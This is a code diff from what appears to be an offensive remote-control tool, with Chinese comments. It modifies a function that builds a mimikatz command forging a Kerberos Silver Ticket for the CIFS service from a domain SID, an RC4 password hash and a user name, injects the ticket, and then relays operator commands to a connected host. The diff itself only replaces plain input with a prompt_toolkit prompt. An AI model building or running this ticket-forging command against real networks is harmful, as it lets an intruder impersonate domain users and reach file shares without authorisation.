@@ -1,4 +1,8 @@
 import struct
+from prompt_toolkit import prompt
+from prompt_toolkit.completion import WordCompleter
+from prompt_toolkit.formatted_text import ANSI
+from prompt_toolkit.history import InMemoryHistory
 
 
 # 使用 Silver Ticket 伪造 CIFS 服务权限
@@ -10,10 +14,16 @@ def Silver_Ticket(conn, choice):
     print('\033[1;34;34m' + "[*] Preparing silver ticket:" + '\033[0m')
     command = "mimikatz.exe \"privilege::debug\" \"kerberos::golden /domain:" + choice.split()[1] + " /sid:" + choice.split()[3] + " /target:dc." + choice.split()[1] + " /service:cifs /rc4:" + choice.split()[2] + " /user:" + choice.split()[4] + " /ptt\" exit"
     receive(conn, command)
+    commands = ["back"]
+    completer = WordCompleter(commands)
+    formatted_text1 = ANSI('\033[1;32;32mSilver Ticket > \033[0m')
+    history = InMemoryHistory()
     while True:
-        command = input('\033[1;33;33m' + "Silver Ticket > " + '\033[0m')
-        if command.lower() == 'exit':
+        command = prompt(formatted_text1, completer=completer, history=history)
+        if command == 'back':
             break
+        elif command == "":
+            continue
         receive(conn, command)
 
 
